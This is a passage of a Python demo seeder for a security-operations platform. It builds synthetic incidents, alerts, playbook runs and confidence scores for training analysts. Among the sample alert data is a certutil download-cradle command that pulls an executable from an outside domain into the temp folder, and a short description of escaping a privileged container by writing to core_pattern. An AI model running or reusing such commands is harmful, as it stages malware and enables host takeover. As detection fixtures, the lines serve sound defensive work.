        "alerts": [
            {
                "title": "M365: Consent to OAuth app `Internal IT Support`",
                "severity": "medium",
                "source": "Microsoft 365",
                "category": "saas",
                "sourcetype": "o365:management:activity",
                "process": "AzureActiveDirectory",
                "ai_score": 0.74,
                "extra": {
                    "Operation": "Consent to application.",
                    "ApplicationDisplayName": "Internal IT Support",
                    "ScopeRequested": "Mail.ReadWrite Files.Read.All offline_access",
                    "UserId": "carol@example.com",
                    "ClientIP": "192.0.2.55",
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "oauth-consent-phish-v1",
            "playbook_name": "OAuth Consent-Phish Response",
            "status": "completed",
            "context": {"app": "Internal IT Support"},
            "steps": [
                ("revoke-consent", "Revoke OAuth grant", "completed", {"duration_ms": 2_500}),
                ("audit-mailbox", "Audit mailbox activity", "completed", {"duration_ms": 8_400}),
                ("delete-inbox-rule", "Delete inbox rule", "completed", {"duration_ms": 1_300}),
            ],
        },
    },
    {
        "key": "INC-RT-010",
        "title": "Privileged container escape on LIN-K8S-NODE-03",
        "description": (
            "A pod created with `privileged: true, hostPID: true` mounted /proc and "
            "wrote to `/proc/sys/kernel/core_pattern` to gain code-execution as root "
            "on the node. Detected by Falco, validated via kube-audit + auditd."
        ),
        "severity": "critical",
        "status": "in_progress",
        "host": "LIN-K8S-NODE-03",
        "user": "system:serviceaccount:dev:builder-sa",
        "src_ip": "10.0.4.91",
        "tactic_ids": ["TA0004", "TA0007"],
        "technique_ids": ["T1611", "T1082"],
        "tags": ["k8s", "container-escape", "privesc"],
        "alerts": [
            {
                "title": "kube-audit: privileged pod created in dev namespace",
                "severity": "high",
                "source": "Suricata IDS",
                "category": "cloud",
                "sourcetype": "kube:audit",
                "process": "kube-apiserver",
                "ai_score": 0.85,
                "extra": {
                    "verb": "create",
                    "objectRef": {"resource": "pods", "namespace": "dev", "name": "build-runner-x9k"},
                    "user": {"username": "system:serviceaccount:dev:builder-sa"},
                    "requestObject": {"spec": {"hostPID": True, "containers": [{"securityContext": {"privileged": True}}]}},
                },
            },
            {
                "title": "auditd: write to /proc/sys/kernel/core_pattern from container",
                "severity": "critical",
                "source": "Suricata IDS",
                "category": "edr",
                "sourcetype": "linux:auditd",
                "process": "/bin/sh",
                "ai_score": 0.93,
                "extra": {
                    "type": "PATH",
                    "name": "/proc/sys/kernel/core_pattern",
                    "exe": "/bin/sh",
                    "auid": 0,
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "container-escape-v1",
            "playbook_name": "Container Escape Containment",
            "status": "running",
            "context": {"namespace": "dev", "pod": "build-runner-x9k"},
            "steps": [
                ("delete-pod", "Delete offending pod", "completed", {"duration_ms": 1_400}),
                ("cordon-node", "Cordon LIN-K8S-NODE-03", "completed", {"duration_ms": 1_900}),
                ("rotate-sa-tokens", "Rotate builder-sa token", "running", {}),
                ("psp-tighten", "Apply PSA `restricted` to dev namespace", "pending", {}),
            ],
        },
    },
    {
        "key": "INC-RT-011",
        "title": "DNS tunnelling exfil from MAC-SARAH-LT (~180 MB over 2 h)",
        "description": (
            "DNS query volume from `MAC-SARAH-LT` rose to 50× baseline with high-"
            "entropy subdomains under `nsdata.io`. Approximate base64 payload size: "
            "180 MB. Matches dnscat2 behaviour."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "MAC-SARAH-LT",
        "user": "sarah@example.com",
        "src_ip": "10.0.6.19",
        "tactic_ids": ["TA0011", "TA0010"],
        "technique_ids": ["T1071.004", "T1048.003"],
        "tags": ["dns-tunnel", "exfiltration"],
        "alerts": [
            {
                "title": "DNS anomaly: 180 MB exfil via TXT under nsdata.io",
                "severity": "high",
                "source": "Suricata IDS",
                "category": "network",
                "sourcetype": "dns:bro",
                "process": "Python",
                "ai_score": 0.90,
                "extra": {
                    "qname_root": "nsdata.io",
                    "subdomain_entropy_p99": 4.6,
                    "qcount_60s": 4_120,
                    "approx_payload_bytes": 188_743_680,
                },
            },
        ],
    },
    {
        "key": "INC-RT-012",
        "title": "Living-off-the-land: certutil download cradle on WIN-PROD-WEB02",
        "description": (
            "`certutil.exe -urlcache -split -f` invoked from cmd.exe spawned by a "
            "Word document macro on `WIN-PROD-WEB02`. Payload `update.exe` was pulled "
            "from a recently-registered domain and quarantined by Defender."
        ),
        "severity": "high",
        "status": "resolved",
        "host": "WIN-PROD-WEB02",
        "user": "alice@example.com",
        "src_ip": "10.0.3.10",
        "tactic_ids": ["TA0002", "TA0005"],
        "technique_ids": ["T1105", "T1218.009"],
        "tags": ["lolbas", "certutil", "office-macro"],
        "alerts": [
            {
                "title": "Sysmon: certutil.exe download cradle from cmd.exe",
                "severity": "high",
                "source": "Microsoft Sysmon",
                "category": "edr",
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "process": "certutil.exe",
                "ai_score": 0.89,
                "extra": {
                    "EventID": 1,
                    "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "ParentCommandLine": r'cmd.exe /c "certutil -urlcache -split -f http://onestopmedia.club/update.exe %TEMP%\update.exe"',
                    "Image": r"C:\Windows\System32\certutil.exe",
                    "User": "CORP\\alice",
                },
            },
            {
                "title": "Defender: Quarantined `update.exe` (Trojan:Win32/Wacatac.B!ml)",
                "severity": "high",
                "source": "Microsoft Defender",
                "category": "edr",
                "sourcetype": "WinEventLog:Microsoft-Windows-Windows Defender/Operational",
                "process": "MsMpEng.exe",
                "ai_score": 0.81,
                "extra": {
                    "EventID": 1116,
                    "ThreatName": "Trojan:Win32/Wacatac.B!ml",
                    "DetectionUser": "CORP\\alice",
                    "Path": r"%TEMP%\update.exe",
                    "ActionTaken": "Quarantine",
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "lolbas-quarantine-v1",
            "playbook_name": "LOLBAS Download-Cradle Response",
            "status": "completed",
            "context": {"binary": "certutil.exe"},
            "steps": [
                ("kill-process", "Kill certutil + spawned children", "completed", {"duration_ms": 1_200}),
                ("quarantine-binary", "Quarantine update.exe", "completed", {"duration_ms": 800}),
                ("block-domain", "Sinkhole onestopmedia.club", "completed", {"duration_ms": 1_900}),
                ("hunt-corp-wide", "Hunt for cradle pattern across fleet", "completed", {"duration_ms": 32_000}),
            ],
        },
    },
    {
        "key": "INC-RT-013",
        "title": "Public S3 bucket `corp-hr-backups` enumerated by external IP",
        "description": (
            "CSPM detected `corp-hr-backups` was set to public-read 36 minutes ago. "
            "CloudTrail shows 312 GetObject calls from a non-corp IP before the policy "
            "was reverted."
        ),
        "severity": "high",
        "status": "contained",
        "host": "AWS::S3::corp-hr-backups",
        "user": "iam-user/devops-admin",
        "src_ip": "104.244.42.193",
        "tactic_ids": ["TA0009", "TA0010"],
        "technique_ids": ["T1530", "T1567.002"],
        "tags": ["aws", "s3", "cspm"],
        "alerts": [
            {
                "title": "CloudTrail: PutBucketAcl public-read on corp-hr-backups",
                "severity": "high",
                "source": "AWS CloudTrail",
                "category": "cloud",
                "sourcetype": "aws:cloudtrail",
                "process": "s3.amazonaws.com",
                "ai_score": 0.91,
                "extra": {
                    "eventName": "PutBucketAcl",
                    "userIdentity": {"type": "IAMUser", "userName": "devops-admin"},
                    "requestParameters": {
                        "bucketName": "corp-hr-backups",
                        "AccessControlPolicy": {
                            "Grants": [{"Permission": "READ", "Grantee": {"URI": "http://acs.amazonaws.com/groups/global/AllUsers"}}]
                        },
                    },
                    "sourceIPAddress": "10.0.2.4",
                },
            },
        ],
    },
    {
        "key": "INC-RT-014",
        "title": "Okta MFA-fatigue against eve@example.com → push-approval success",
        "description": (
            "Attacker pumped 23 MFA push notifications over 6 minutes; user "
            "approved on the 21st prompt, granting access from a Russia-based IP."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "MAC-EVE-LT",
        "user": "eve@example.com",
        "src_ip": "5.188.86.69",
        "tactic_ids": ["TA0006", "TA0001"],
        "technique_ids": ["T1621"],
        "tags": ["mfa-fatigue", "okta", "identity"],
        "alerts": [
            {
                "title": "Okta: 23 MFA push challenges in 6 min for eve@example.com",
                "severity": "high",
                "source": "Okta",
                "category": "identity",
                "sourcetype": "okta:im",
                "process": "okta.policy.evaluate_sign_on",
                "ai_score": 0.92,
                "extra": {
                    "eventType": "user.mfa.factor.push.challenge.send",
                    "outcome": {"result": "SUCCESS"},
                    "actor": {"alternateId": "eve@example.com"},
                    "client": {"ipAddress": "5.188.86.69", "country": "Russia"},
                    "challenge_count": 23,
                },
            },
            {
                "title": "Okta: Push-approval success after 21 denies — eve@example.com",
                "severity": "high",
                "source": "Okta",
                "category": "identity",
                "sourcetype": "okta:im",
                "process": "okta.policy.evaluate_sign_on",
                "ai_score": 0.88,
                "extra": {
                    "eventType": "user.authentication.auth_via_mfa",
                    "outcome": {"result": "SUCCESS", "reason": "PUSH_APPROVED"},
                    "actor": {"alternateId": "eve@example.com"},
                    "client": {"ipAddress": "5.188.86.69"},
                },
            },
        ],
        "playbook_run": {
            "playbook_id": "mfa-fatigue-v1",
            "playbook_name": "MFA Fatigue Containment",
            "status": "running",
            "context": {"user": "eve@example.com"},
            "steps": [
                ("suspend-session", "Suspend Okta session", "completed", {"duration_ms": 1_500}),
                ("require-fido2", "Require FIDO2 / WebAuthn for re-auth", "completed", {"duration_ms": 2_400}),
                ("revoke-tokens", "Revoke OAuth tokens", "running", {}),
                ("page-user", "Page user on out-of-band channel", "pending", {}),
            ],
        },
    },
    {
        "key": "INC-RT-015",
        "title": "RDP brute-force from TOR exit + lateral move to DC01",
        "description": (
            "WinEventLog shows 1,200+ failed 4625 logons against `WIN-PROD-WEB02` "
            "from a TOR exit, then a single 4624 success followed by an SMB lateral "
            "connection to DC01. Host has been isolated."
        ),
        "severity": "high",
        "status": "open",
        "host": "WIN-PROD-WEB02",
        "user": "administrator",
        "src_ip": "185.220.101.6",
        "tactic_ids": ["TA0006", "TA0008"],
        "technique_ids": ["T1110.001", "T1021.001"],
        "tags": ["brute-force", "rdp", "tor", "lateral"],
        "alerts": [
            {
                "title": "WinEventLog: 1,247 failed 4625 logons from 185.220.101.6",
                "severity": "high",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.93,
                "extra": {
                    "EventCode": 4625,
                    "FailureReason": "Unknown user name or bad password.",
                    "TargetUserName": "administrator",
                    "WorkstationName": "kali",
                    "IpAddress": "185.220.101.6",
                    "LogonType": 10,
                    "failure_count": 1_247,
                },
            },
            {
                "title": "WinEventLog: success 4624 LogonType=10 from TOR exit",
                "severity": "critical",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.94,
                "extra": {
                    "EventCode": 4624,
                    "LogonType": 10,
                    "TargetUserName": "administrator",
                    "IpAddress": "185.220.101.6",
                    "AuthenticationPackageName": "Negotiate",
                },
            },
            {
                "title": "WinEventLog: SMB connection WIN-PROD-WEB02 → DC01.corp.example.com",
                "severity": "high",
                "source": "Windows Security",
                "category": "siem",
                "sourcetype": "WinEventLog:Security",
                "process": "lsass.exe",
                "ai_score": 0.86,
                "extra": {
                    "EventCode": 5145,
                    "ShareName": r"\\*\C$",
                    "IpAddress": "10.0.3.10",
                    "TargetServerName": "DC01.corp.example.com",
                    "TargetUserName": "administrator",
                },
            },
        ],
    },
]


def _random_ip() -> str:
    return ".".join(str(_rng.randint(1, 254)) for _ in range(4))


def _pick_techniques(k: int = 2) -> list[dict]:
    chosen = _rng.sample(_TECHNIQUES, k=k)
    return [{"tactic": t[1], "tactic_id": t[0], "technique": t[3], "technique_id": t[2]} for t in chosen]


# ---------------------------------------------------------------------------
# Confidence synthesis
# ---------------------------------------------------------------------------
#
# In a real deployment, services/fusion runs ConfidenceScorer over every fused
# alert and writes `confidence_score` (0.0-1.0), `confidence_label`, and
# `confidence_rationale` to Kafka, which the API persists onto the Alert row.
# The demo seeder never goes through that pipeline, so we mirror the exact
# scoring contract here. The constants below MUST stay aligned with
# services/fusion/app/services/confidence.py — if the real scorer rebalances
# weights, this helper should follow.

# Score → label thresholds (mirror services/fusion).
_CONFIDENCE_HIGH_THRESHOLD = 0.70
_CONFIDENCE_LOW_THRESHOLD = 0.40

# Factor weights — keep summing to 1.0 if you tweak (mirror services/fusion).
_WEIGHT_SEVERITY = 0.20
_WEIGHT_ML_ANOMALY = 0.18
_WEIGHT_ML_PRIORITY = 0.18
_WEIGHT_MITRE = 0.14
_WEIGHT_THREAT_INTEL = 0.16
_WEIGHT_UPSTREAM = 0.08
_WEIGHT_IOC_DENSITY = 0.06

_SEVERITY_CONTRIBUTION = {
    "critical": 1.0,
    "high": 0.6,
    "medium": 0.0,
    "low": -0.5,
    "info": -1.0,
}


def _confidence_label_from_score(score: float) -> str:
    if score >= _CONFIDENCE_HIGH_THRESHOLD:
        return "high"
    if score < _CONFIDENCE_LOW_THRESHOLD:
        return "low"
    return "medium"


def _synthesise_confidence(
    *,
    severity: str,
    ai_score: float,
    n_techniques: int,
    n_iocs: int,
    has_threat_intel: bool,
) -> tuple[int, str, list[dict]]:
    """Mirror services/fusion ConfidenceScorer for the demo seeder.

    Returns ``(confidence_int_0_100, label, rationale_list)`` so the seeded
    Alert rows look identical to what a live fusion service would write.
    The rationale is a list of dicts in ConfidenceFactor shape (factor / label
    / value / contribution / weight) sorted by impact, so the UI can render
    "why we believe what we believe" without any code-path divergence.

    Contribution model, factor weights, labels, and value strings are kept in
    lock-step with ``services/fusion/app/services/confidence.py``. If that
    scorer is rebalanced, update this helper alongside it.
    """

    def _ml(value: float) -> float:
        # ML scores already live in [0, 1]; recentre on 0.5 → [-1, +1].
        return max(-1.0, min(1.0, (value - 0.5) * 2.0))

    rationale: list[dict] = []

    # 1. Severity
    sev_c = _SEVERITY_CONTRIBUTION.get(severity, 0.0)
    rationale.append(
        {
            "factor": "severity",
            "label": "Alert severity",
            "value": severity,
            "contribution": sev_c,
            "weight": _WEIGHT_SEVERITY,
        }
    )

    # 2. ML anomaly score (anomaly_score in fusion).
    anomaly_c = _ml(ai_score)
    rationale.append(
        {
            "factor": "ml_anomaly",
            "label": "ML anomaly score",
            "value": f"{ai_score:.2f}",
            "contribution": anomaly_c,
            "weight": _WEIGHT_ML_ANOMALY,
        }
    )

    # 3. ML priority rank (priority_score in fusion). The seeder only has a
    # single ``ai_score`` to draw from, so we jitter it slightly to mimic the
    # second model the real scorer consults — the rank is typically close to,
    # but not identical to, the anomaly score.
    priority_proxy = max(0.0, min(1.0, ai_score + _rng.uniform(-0.1, 0.1)))
    priority_c = _ml(priority_proxy)
    rationale.append(
        {
            "factor": "ml_priority",
            "label": "ML priority rank",
            "value": f"{priority_proxy:.2f}",
            "contribution": priority_c,
            "weight": _WEIGHT_ML_PRIORITY,
        }
    )

    # 4. MITRE coverage — bands match _mitre_contribution() in fusion.
    if n_techniques == 0:
        mitre_c = -0.4
    elif n_techniques == 1:
        mitre_c = 0.0
    elif n_techniques == 2:
        mitre_c = 0.4
    else:
        mitre_c = min(1.0, 0.4 + (n_techniques - 2) * 0.2)
    mitre_value = "1 technique" if n_techniques == 1 else f"{n_techniques} techniques"
    rationale.append(
        {
            "factor": "mitre_coverage",
            "label": "MITRE technique coverage",
            "value": mitre_value,
            "contribution": mitre_c,
            "weight": _WEIGHT_MITRE,
        }
    )

    # 5. Threat-intel — fusion looks at MISP / OTX / TAXII / KEV / VirusTotal
    # hits. The seeder doesn't run enrichments, so collapse to a binary signal
    # but keep the contribution and value strings faithful to the single-hit
    # path of ``_ti_contribution``.
    if has_threat_intel:
        ti_c = 0.6
        ti_value = "MISP"
    else:
        ti_c = -0.3
        ti_value = "no TI match"
    rationale.append(
        {
            "factor": "threat_intel",
            "label": "Threat-intel match",
            "value": ti_value,
            "contribution": ti_c,
            "weight": _WEIGHT_THREAT_INTEL,
        }
    )

    # 6. Upstream vendor risk score. Real fusion uses ``raw_alert.risk_score``;
    # the seeder doesn't carry one, so we reuse ai_score as a faithful proxy
    # (same family of [0..1] vendor risk signals).
    upstream_c = _ml(ai_score)
    rationale.append(
        {
            "factor": "upstream_risk",
            "label": "Upstream vendor risk score",
            "value": f"{ai_score:.2f}",
            "contribution": upstream_c,
            "weight": _WEIGHT_UPSTREAM,
        }
    )

    # 7. IOC density — bands match _ioc_density_contribution() in fusion.
    if n_iocs == 0:
        ioc_c = -0.6
    elif n_iocs <= 2:
        ioc_c = 0.0
    elif n_iocs <= 4:
        ioc_c = 0.5
    else:
        ioc_c = 1.0
    rationale.append(
        {
            "factor": "ioc_density",
            "label": "IOC density",
            "value": f"{n_iocs} populated fields",
            "contribution": ioc_c,
            "weight": _WEIGHT_IOC_DENSITY,
        }
    )

    # Combine: score = 0.5 + Σ(w_i * c_i), clamped to [0, 1].
    delta = sum(f["weight"] * f["contribution"] for f in rationale)
    score = max(0.0, min(1.0, 0.5 + delta))
    label = _confidence_label_from_score(score)

    # Sort rationale by absolute impact so the UI shows top drivers first
    # (matches fusion's ConfidenceScorer.score).
    rationale.sort(key=lambda f: abs(f["contribution"] * f["weight"]), reverse=True)

    return int(round(score * 100)), label, rationale


def _make_alert(tenant_id: uuid.UUID, when: datetime) -> Alert:
    # Sample severity across all five tiers so the demo exercises every
    # band defined by v1.5 W2 (critical-severity work). Weights bias toward
    # medium/high noise, with a long tail of info-grade telemetry that lets
    # operators rehearse min_confidence and severity filtering in /alerts.
    severity = _rng.choices(_ALERT_SEVERITIES, weights=[10, 25, 35, 20, 10])[0]
    status = _rng.choices(_STATUSES, weights=[40, 20, 15, 20, 5])[0]
    src_name, src_cat = _rng.choice(_SOURCES)
    host = _rng.choice(_HOSTS)
    user = _rng.choice(_USERS)
    ip = _random_ip()
    title = _rng.choice(_TITLES).format(host=host, user=user, ip=ip)
    techniques = _pick_techniques(_rng.randint(1, 3))

    priority_floor = {"critical": 90, "high": 75, "medium": 50, "low": 25, "info": 10}[severity]
    priority = priority_floor + _rng.randint(-10, 10)
    ai_score = _rng.uniform(0.3, 0.99)

    # IOC count: 1 IP + 1 host + 1 user = 3 by default. About 1-in-4 alerts
    # also carry a threat-intel hit, which spikes confidence in the rationale.
    has_threat_intel = _rng.random() < 0.25
    n_iocs = 3
    confidence_int, confidence_label, confidence_rationale = _synthesise_confidence(
        severity=severity,
        ai_score=ai_score,
        n_techniques=len(techniques),
        n_iocs=n_iocs,
        has_threat_intel=has_threat_intel,
    )

    return Alert(
        tenant_id=tenant_id,
        title=title,
        description=f"{src_name} detected suspicious activity. Auto-correlated with {len(techniques)} ATT&CK techniques.",
        severity=severity,
        status=status,
        priority=max(0, min(100, priority)),
        category=src_cat,
        mitre_tactics=[{"id": t["tactic_id"], "name": t["tactic"]} for t in techniques],
        mitre_techniques=[{"id": t["technique_id"], "name": t["technique"]} for t in techniques],
        connector_type=src_name.lower().replace(" ", "_"),
        ai_score=ai_score,
        ai_summary=(
            f"AI assessed this as a {severity} severity event tied to "
            f"{techniques[0]['technique']} ({techniques[0]['technique_id']}). "
            f"Recommend isolating {host} pending investigation."
        ),
        ai_recommendations=[
            f"Isolate host {host}",
            f"Reset credentials for {user}",
            "Open a triage case and link related alerts",
        ],
        affected_ips=[ip],
        affected_hosts=[host],
        affected_users=[user],
        raw_event={
            "source": src_name,
            "host": host,
            "user": user,
            "src_ip": ip,
            "process": "powershell.exe" if "PowerShell" in title else "explorer.exe",
        },
        tags=[src_cat, "demo", severity],
        event_time=when,
        first_seen=when,
        last_seen=when,
        resolved_at=when + timedelta(hours=4) if status == "resolved" else None,
        confidence=confidence_int,
        confidence_label=confidence_label,
        confidence_rationale=confidence_rationale,
        created_at=when,
        updated_at=when,
    )


def _make_case(tenant_id: uuid.UUID, idx: int, when: datetime, alert_ids: list[uuid.UUID]) -> Case:
    severity = _rng.choices(_SEVERITIES, weights=[20, 35, 30, 15])[0]
    status = _rng.choices(
        ["open", "in_progress", "pending", "resolved", "closed"],
        weights=[30, 35, 10, 15, 10],
    )[0]
    techniques = _pick_techniques(2)
    # Human-readable identifier for the stock catalogue (INC-001, INC-002, …).
    # The hot showcase deeplink (/cases/INC-RT-001?tab=ledger) targets the
    # in-flight LockBit 3.0 ransomware investigation seeded separately above.
    return Case(
        tenant_id=tenant_id,
        case_number=f"INC-{idx + 1:03d}",
        title=_rng.choice(
            [
                "Coordinated brute-force campaign across SaaS apps",
                "Possible data exfiltration via cloud storage",
                "Endpoint compromise — finance workstation",
                "Suspected insider threat — HR records access",
                "Ransomware precursor — staging activity detected",
                "Phishing wave targeting engineering team",
            ]
        ),
        description="Auto-generated demo case. Multiple alerts correlated by entity and ATT&CK technique.",
        status=status,
        priority=severity,
        severity=severity,
        case_type="security_incident",
        mitre_tactics=[{"id": t["tactic_id"], "name": t["tactic"]} for t in techniques],
        mitre_techniques=[{"id": t["technique_id"], "name": t["technique"]} for t in techniques],
        alert_ids=[str(a) for a in alert_ids],
        tags=["demo", severity, "correlated"],
        summary="Demo case used by the seed_demo script.",
        created_at=when,
        updated_at=when,
        closed_at=when + timedelta(days=2) if status in ("resolved", "closed") else None,
    )


def _make_connectors(tenant_id: uuid.UUID) -> list[Connector]:
    rows: list[Connector] = []
    for name, cat in _SOURCES:
        rows.append(
            Connector(
                tenant_id=tenant_id,
                name=name,
                connector_type=name.lower().replace(" ", "_"),
                category=cat,
                is_enabled=True,
                health_status=_rng.choice(["healthy", "healthy", "healthy", "degraded"]),
                last_sync=datetime.now(UTC) - timedelta(minutes=_rng.randint(0, 60)),
                last_health_check=datetime.now(UTC) - timedelta(minutes=_rng.randint(0, 30)),
                events_ingested=_rng.randint(1_000, 250_000),
                error_count=_rng.randint(0, 12),
                tags=["demo", cat],
            )
        )
    return rows


# ─── Seeders ───────────────────────────────────────────────────────────────────


async def _ensure_tenant(session) -> Tenant:
    result = await session.execute(select(Tenant).where(Tenant.id == DEMO_TENANT_ID))
    tenant = result.scalar_one_or_none()
    if tenant:
        return tenant
    tenant = Tenant(
        id=DEMO_TENANT_ID,
        name="AiSOC Demo Tenant",
        slug="demo",
        plan="enterprise",
        is_active=True,
        settings={"demo": True, "branding": "AiSOC"},
        limits={"alerts_per_day": 1_000_000},
    )
    session.add(tenant)
    await session.flush()
    return tenant


async def _ensure_user(session, tenant: Tenant) -> User:
    """Upsert the demo user.

    If the deterministic demo user already exists from a previous seed (with a
    stale email like the old ``demo@aisoc.local``, or a different password),
    bring it back into sync rather than skipping. This keeps re-seeds idempotent
    *and* self-healing against drift introduced by previous schema decisions.
    """
    result = await session.execute(select(User).where(User.id == DEMO_USER_ID))
    user = result.scalar_one_or_none()
    hashed = get_password_hash("aisoc-demo")
    if user is not None:
        user.tenant_id = tenant.id
        user.email = DEMO_USER_EMAIL
        user.username = "demo"
        user.hashed_password = hashed
        user.role = DEMO_USER_ROLE
        user.is_active = True
        user.is_verified = True
        await session.flush()
        return user
    user = User(
        id=DEMO_USER_ID,
        tenant_id=tenant.id,
        email=DEMO_USER_EMAIL,
        username="demo",
        hashed_password=hashed,
        role=DEMO_USER_ROLE,
        is_active=True,
        is_verified=True,
        preferences={"theme": "dark"},
    )
    session.add(user)
    await session.flush()
    return user


async def _seed_connectors(session, tenant: Tenant) -> int:
    result = await session.execute(select(Connector).where(Connector.tenant_id == tenant.id))
    if result.scalars().first() is not None:
        return 0
    rows = _make_connectors(tenant.id)
    session.add_all(rows)
    await session.flush()
    return len(rows)


def _make_synthetic_case(tenant_id: uuid.UUID, idx: int, when: datetime, alert_ids: list[uuid.UUID]) -> Case:
    """Create a richly annotated synthetic incident from _SYNTHETIC_INCIDENTS for p1-eval."""
    scenario = _SYNTHETIC_INCIDENTS[idx % len(_SYNTHETIC_INCIDENTS)]
    title_tpl, tactic_ids, technique_ids, desc_tpl = scenario

    host = _rng.choice(_HOSTS)
    user = _rng.choice(_USERS)
    ip = _random_ip()

    title = title_tpl.format(host=host, user=user, ip=ip)
    description = desc_tpl.format(host=host, user=user, ip=ip)

    # Build ATT&CK arrays from the scenario's explicit tactic/technique lists
    tactics = [{"id": t_id, "name": next((t[1] for t in _TECHNIQUES if t[0] == t_id), t_id)} for t_id in tactic_ids]
    techniques = [{"id": t_id, "name": next((t[3] for t in _TECHNIQUES if t[2] == t_id), t_id)} for t_id in technique_ids]

    severity = _rng.choices(_SEVERITIES, weights=[25, 40, 25, 10])[0]
    status = _rng.choices(
        ["open", "in_progress", "pending", "resolved", "closed"],
        weights=[30, 35, 10, 15, 10],
    )[0]

    return Case(
        tenant_id=tenant_id,
        case_number=f"CASE-SYN-{2000 + idx:04d}",
        title=title,
        description=description,
        status=status,
        priority=severity,
        severity=severity,
        case_type="security_incident",
        mitre_tactics=tactics,
        mitre_techniques=techniques,
        alert_ids=[str(a) for a in alert_ids],
        tags=["demo", "synthetic", severity] + tactic_ids[:2],
        summary=(
            f"Synthetic incident #{idx + 1} for AI investigator evaluation. "
            f"host={host} user={user} src_ip={ip} "
            f"expected_tactics={','.join(tactic_ids)} "
            f"expected_techniques={','.join(technique_ids)}"
        ),
        created_at=when,
        updated_at=when,
        closed_at=when + timedelta(days=2) if status in ("resolved", "closed") else None,
    )


# ─── Realistic-incident helpers (BOTS / SecRepo-shaped) ────────────────────────


# Technique-id → human-readable name. Backfills techniques that aren't in the
# small `_TECHNIQUES` random pool used by `_make_alert`.
_TACTIC_NAMES = {t[0]: t[1] for t in _TECHNIQUES}
_TECHNIQUE_NAMES: dict[str, str] = {
    **{t[2]: t[3] for t in _TECHNIQUES},
    "T1110.004": "Credential Stuffing",
    "T1078.004": "Cloud Accounts",
    "T1021.002": "SMB/Windows Admin Shares",
    "T1567.002": "Exfiltration to Cloud Storage",
    "T1530": "Data from Cloud Storage Object",
    "T1195.002": "Compromise Software Supply Chain",
    "T1059.004": "Unix Shell",
    "T1071.001": "Application Layer Protocol: Web Protocols",
    "T1071.004": "Application Layer Protocol: DNS",
    "T1218.009": "System Binary Proxy: Regsvr32 / certutil",
    "T1105": "Ingress Tool Transfer",
    "T1003.006": "OS Credential Dumping: DCSync",
    "T1558.003": "Steal or Forge Kerberos Tickets: Kerberoasting",
    "T1657": "Financial Theft",
    "T1566.001": "Phishing: Spearphishing Attachment",
    "T1528": "Steal Application Access Token",
    "T1611": "Escape to Host",
    "T1621": "Multi-Factor Authentication Request Generation",
    "T1055.012": "Process Injection: Process Hollowing",
    "T1048.003": "Exfiltration Over Alternative Protocol: Unencrypted DNS",
    "T1021.001": "Remote Services: Remote Desktop Protocol",
}


def _alert_status_for_case(case_status: str) -> str:
    """Map ORM case status to a sensible Alert.status for realistic incidents."""
    return {
        "in_progress": "investigating",
        "open": "triaged",
        "contained": "investigating",
        "resolved": "resolved",
        "closed": "resolved",
    }.get(case_status, "triaged")


def _bots_raw_event(
    when: datetime,
    *,
    source: str,
    sourcetype: str,
    host: str,
    user: str,
    src_ip: str,
    process: str | None,
    extra: dict,
) -> dict:
    """Build a Splunk BOTS / SecRepo-style raw_event blob.

    Fields mirror what investigators see when running `index=main host=$host`
    queries in the BOTS public datasets — `_time`, `_indextime`, `index`,
    `source`, `sourcetype`, plus the vendor-specific structured payload.
    """
    base: dict = {
        "_time": when.timestamp(),
        "_indextime": (when + timedelta(seconds=2)).timestamp(),
        "_event_id": str(uuid.uuid4()),
        "index": "main",
        "source": source,
        "sourcetype": sourcetype,
        "host": host,
        "user": user,
        "src_ip": src_ip,
    }
    if process:
        base["process"] = process
    base.update(extra)
    return base


def _make_realistic_alert(
    tenant_id: uuid.UUID,
    incident: dict,
    alert_spec: dict,
    *,
    when: datetime,
    case_status: str,
) -> Alert:
    severity = alert_spec["severity"]
    priority = {"critical": 92, "high": 78, "medium": 55, "low": 28}[severity]
    techniques = [{"id": tid, "name": _TECHNIQUE_NAMES.get(tid, tid)} for tid in incident["technique_ids"]]
    tactics = [{"id": tid, "name": _TACTIC_NAMES.get(tid, tid)} for tid in incident["tactic_ids"]]

    raw_event = _bots_raw_event(
        when,
        source=alert_spec["source"],
        sourcetype=alert_spec["sourcetype"],
        host=incident["host"],
        user=incident["user"],
        src_ip=incident["src_ip"],
        process=alert_spec.get("process"),
        extra=alert_spec.get("extra", {}),
    )

    ai_score = alert_spec.get("ai_score", 0.85)
    # Hand-crafted realistic incidents always carry MITRE techniques and at
    # least three IOCs (host + user + src_ip). They're modeled on real BOTS
    # data and the threat-intel signal is typically present, so we always set
    # has_threat_intel=True for these — that's what makes them showcase-grade.
    confidence_int, confidence_label, confidence_rationale = _synthesise_confidence(
        severity=severity,
        ai_score=ai_score,
        n_techniques=len(techniques),
        n_iocs=3,
        has_threat_intel=True,
    )

    return Alert(
        tenant_id=tenant_id,
        title=alert_spec["title"],
        description=(f"{alert_spec['source']} detection. {incident['description']}"),
        severity=severity,
        status=_alert_status_for_case(case_status),
        priority=priority,
        category=alert_spec.get("category", "siem"),
        mitre_tactics=tactics,
        mitre_techniques=techniques,
        connector_type=alert_spec["source"].lower().replace(" ", "_"),
        ai_score=ai_score,
        ai_summary=(
            f"AI assessed this {severity} alert as part of incident "
            f"{incident['key']} ({incident['title']}). "
            f"Primary technique: {techniques[0]['name']} ({techniques[0]['id']})."
        ),
        ai_recommendations=[
            f"Investigate host {incident['host']}",
            f"Review activity for {incident['user']}",
            f"Open case linked to {incident['key']}",
        ],
        affected_ips=[incident["src_ip"]],
        affected_hosts=[incident["host"]],
        affected_users=[incident["user"]],
        raw_event=raw_event,
        tags=["realistic", incident["key"], severity, *incident["tags"]],
        event_time=when,
        first_seen=when,
        last_seen=when,
        resolved_at=when + timedelta(hours=2) if case_status in ("resolved", "closed") else None,
        confidence=confidence_int,
        confidence_label=confidence_label,
        confidence_rationale=confidence_rationale,
        created_at=when,
        updated_at=when,
    )


def _make_realistic_case(
    tenant_id: uuid.UUID,
    incident: dict,
    *,
    when: datetime,
    alert_ids: list[uuid.UUID],
